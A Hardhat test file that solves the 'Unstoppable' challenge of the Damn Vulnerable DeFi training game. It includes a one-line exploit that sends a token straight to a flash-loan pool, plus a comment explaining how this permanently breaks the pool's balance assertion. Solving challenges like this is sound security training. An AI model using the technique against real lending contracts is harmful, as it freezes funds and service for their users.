const { ethers } = require("hardhat");
const { expect } = require("chai");

describe("Damn Vulnerable DeFi - Unstoppable", function () {
  let deployer, attacker, someUser;

  // Pool has 1M * 10**18 tokens
  const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
  const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther("100");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    [deployer, attacker, someUser] = await ethers.getSigners();

    const DamnValuableTokenFactory = await ethers.getContractFactory(
      "DamnValuableToken",
      deployer
    );
    const UnstoppableLenderFactory = await ethers.getContractFactory(
      "UnstoppableLender",
      deployer
    );

    this.token = await DamnValuableTokenFactory.deploy();
    this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

    await this.token.approve(this.pool.address, TOKENS_IN_POOL);
    await this.pool.depositTokens(TOKENS_IN_POOL);

    await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

    expect(await this.token.balanceOf(this.pool.address)).to.equal(
      TOKENS_IN_POOL
    );

    expect(await this.token.balanceOf(attacker.address)).to.equal(
      INITIAL_ATTACKER_TOKEN_BALANCE
    );

    // Show it's possible for someUser to take out a flash loan
    const ReceiverContractFactory = await ethers.getContractFactory(
      "ReceiverUnstoppable",
      someUser
    );
    this.receiverContract = await ReceiverContractFactory.deploy(
      this.pool.address
    );
    await this.receiverContract.executeFlashLoan(10);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    await this.token.connect(attacker).transfer(this.pool.address, 1);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    // It is no longer possible to execute flash loans
    await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted;
  });
});

// https://www.damnvulnerabledefi.xyz/challenges/1.html

// Solution:
// The exploit lies in the fact that the flashLoan method in the lender
// contains a check saying assert(poolBalance == balanceBefore)
// It's assuming that the lender will only receive tokens via
// its depositTokens method which updates poolBalance too
// But the token is a normal ERC20 contract. Anyone can send tokens
// to the lenders balance and increase it thus causing poolBalance
// to not match the token balance of the lender. This causes
// assert to revert the flashLoan transaction and the lender breaks!
